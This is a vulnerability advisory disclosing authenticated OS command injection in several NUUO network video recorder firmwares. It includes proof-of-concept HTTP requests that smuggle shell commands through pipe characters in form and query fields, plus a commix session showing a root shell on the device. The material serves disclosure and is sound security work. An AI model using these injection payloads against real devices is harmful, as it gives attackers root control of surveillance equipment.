@@ -1,0 +1,127 @@
+﻿NUUO Multiple OS Command Injection Vulnerabilities
+
+
+Vendor: NUUO Inc.
+Product web page: http://www.nuuo.com
+Affected version: <=3.0.8 (NE-4160, NT-4040, NT-4040(R))
+                  DP: <=04.07.0000.0030, <=04.03.0000.0035
+                  FW: <=02.02.00, <=1.7.0
+
+Summary: NUUO NVRmini 2 is the lightweight, portable NVR solution with NAS
+functionality. Setup is simple and easy, with automatic port forwarding
+settings built in. NVRmini 2 supports POS integration, making this the perfect
+solution for small retail chain stores. NVRmini 2 also comes full equipped as
+a NAS, so you can enjoy the full storage benefits like easy hard drive hot-swapping
+and RAID functions for data protection. Choose NVR and know that your valuable video
+data is safe, always.
+
+NUUO Titan NVR is NUUO's Linux-based open platform recording solution. It is built
+on Linux Foundation, with cross-platform Windows and MAC client software. It supports
+up to 64 channels of megapixel recording with 250 Mbps throughput. It also comes with
+a myriads of features that will sure to fulfill even the most demanding projects. Supports
+over 2300 camera models from over 100 vendors.
+
+Desc: NUUO NVRmini, NVRmini2, Crystal, NVRSolo and NVRTitan suffers from multiple
+authenticated OS command injection vulnerabilities. This can be exploited to inject
+and execute arbitrary shell commands as the root user.
+
+Tested on: GNU/Linux 3.0.8 (armv7l)
+           GNU/Linux 2.6.31.8 (armv5tel)
+           lighttpd/1.4.28
+           lighttpd/1.4.35
+           PHP/5.5.3
+           PHP/5.6.0
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2016-5351
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5351.php
+
+
+14.01.2016
+
+--
+
+
+NVRTitan:
+
+POST /handle_iscsi.php HTTP/1.1
+Host: 10.0.0.17
+Content-Length: x
+Origin: http://10.0.0.17
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Accept: */*
+Referer: http://10.0.0.17/iscsi.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.8
+Cookie: PHPSESSID=c9fdced9e8129eb4c14e3154cd0e0ce3; lang=en; loginName=admin
+Connection: close
+
+act=discover&address=1.1.1.1|echo%20pwn&port=3260
+
+
+
+
+HTTP/1.1 200 OK
+X-Powered-By: PHP/5.6.0
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-type: text/html; charset=UTF-8
+Connection: close
+Date: Mon, 18 Apr 2016 08:52:17 GMT
+Server: lighttpd/1.4.35
+Content-Length: x
+
+pwn
+
+
+============================================================
+
+
+NVRmini/2/Solo/Crystal:
+
+GET /cgi-bin/cgi_system?cmd=raid_setup&act=getsmartinfo&devname=|ping%20-n%200%20localhost&rand=1452765315144 HTTP/1.1
+Host: 10.0.0.17
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36
+X-Requested-With: XMLHttpRequest
+Accept: */*
+Referer: http://10.0.0.17/raid.php
+Accept-Encoding: gzip, deflate, sdch
+Accept-Language: en-US,en;q=0.8
+Cookie: PHPSESSID=3bc601000ea8f085c22cb37b9b102b7f; lang=en
+Connection: close
+
+---
+
+POST /cgi-bin/cgi_system?cmd=saveconfig HTTP/1.1
+Host: 10.0.0.17
+Content-Length: 97
+Cache-Control: max-age=0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Origin: http://10.0.0.17
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36
+Content-Type: application/x-www-form-urlencoded
+Referer: http://10.0.0.17/save_config.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.8
+Cookie: PHPSESSID=3bc601000ea8f085c22cb37b9b102b7f; lang=en
+Connection: close
+
+bfolder=%2Fmtd%2Fblock3&bfile=|ping%20-n%200%20localhost&inc_emap=no&inc_pos=no
+
+
+---
+
+Sample session from commix:
+
+Shell > whoami
+root
+Shell > ls
+Default.ini EMap PatrolOpt003.xml PatrolOpt009.xml PatrolOpt015.xml access apcupsd authority.lic auto_upgrade.ini autoarchive.ini camera.ini cameraparam.ini cmsserver.ini cmsstat daylightsaving.ini ddns.ini dualstreaming.ini email.ini eventaction.ini ezNUUO iobox.ini lenssetting.ini lighttpd-inc.conf lighttpd.conf liveserver.ini notice.ini nuservice.conf pos proftpd-inc.conf pushnotification raid_info.xml recordingmode.ini schedule.ini scheduler_dio.ini scheduler_motion.ini smb-inc.conf version.xml
